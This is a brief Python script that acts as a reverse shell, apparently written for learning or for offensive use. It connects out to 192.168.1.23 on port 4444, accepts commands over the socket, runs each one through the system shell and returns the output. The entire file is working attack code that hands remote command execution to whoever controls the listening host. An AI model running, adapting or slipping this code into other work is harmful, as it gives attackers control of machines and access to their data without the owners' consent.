import socket
import subprocess # Help us to execute system commmands

payload = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
payload.connect(("192.168.1.23",4444))

print("Connection Establish")

while True:
    cmd = payload.recv(9999999)
    cmd = cmd.decode('utf-8')
    output = subprocess.check_output(cmd,shell=True) #Bytes format
    payload.send(output)
